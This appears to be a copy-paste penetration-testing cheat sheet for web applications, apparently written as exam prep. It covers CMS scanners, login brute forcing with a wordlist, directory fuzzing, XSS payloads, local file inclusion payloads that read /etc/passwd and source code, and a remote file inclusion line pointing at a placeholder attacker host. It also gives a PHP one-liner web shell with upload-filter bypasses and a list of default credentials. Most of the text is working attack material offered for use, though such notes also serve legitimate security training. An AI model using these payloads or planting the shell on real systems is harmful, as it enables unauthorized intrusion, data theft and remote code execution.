# 12 Web Apps — copy-paste commands

> Replace `<URL>` with full target URL, `<IP>` with IP.

## WordPress — wpscan

```bash
# Basic — detects version + plugins
wpscan --url http://<IP> --enumerate vp,u

# Aggressive + plugin vulns (needs API token for CVE details)
wpscan --url http://<IP> --enumerate ap,u,vp --api-token <TOKEN>

# Brute force login (usernames enumerated first)
wpscan --url http://<IP> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

→ See [wpscan.md](../tools/wpscan.md)

## Joomla — joomscan

```bash
joomscan -u http://<IP>
joomscan -u http://<IP> --enumerate-components
```

## Drupal — droopescan

```bash
droopescan scan drupal -u http://<IP>
```

## Nuclei — template vuln scanner

```bash
# Default templates
nuclei -u http://<IP>

# Specific severity
nuclei -u http://<IP> -severity critical,high

# Specific tag
nuclei -u http://<IP> -tags cve,rce

# Update templates first (if internet)
nuclei -update-templates
```

→ See [nuclei.md](../tools/nuclei.md)

## Directory brute force (quick recap — see [11-web-servers](../11-web-servers/commands.md))

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
```

## XSS — quick manual payloads

```
<script>alert(1)</script>
"><script>alert(1)</script>
"><svg onload=alert(1)>
javascript:alert(1)
```

Paste into every input → check if the payload renders in response.

## LFI — common payloads

```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=php://filter/convert.base64-encode/resource=index.php
?file=/proc/self/environ
```

Test with curl:
```bash
curl "http://<IP>/index.php?file=../../../../etc/passwd"
```

## RFI

```
?file=http://<ATTACKER>/shell.txt
```

Host shell.txt with:
```bash
python3 -m http.server 8000
```

## File upload — PHP one-liner shell

```php
<?php system($_GET['c']); ?>
```

Save as `shell.php`, upload, then:
```bash
curl "http://<IP>/uploads/shell.php?c=id"
```

Bypass tricks: `.phtml`, `.php5`, `shell.php.jpg`, double extension, Content-Type swap in Burp.

## Burp Suite — the exam flow

1. Start Burp → Proxy → Intercept ON
2. Firefox → set proxy to `127.0.0.1:8080`
3. Browse the app → right-click request → **Send to Repeater**
4. Modify → **Send** → read response
5. For fuzzing → **Send to Intruder** → position `§marker§` → load payload list

→ See [burpsuite.md](../tools/burpsuite.md)

## Default creds to always try

```
admin:admin
admin:password
admin:admin123
root:root
tomcat:tomcat
tomcat:s3cret
```
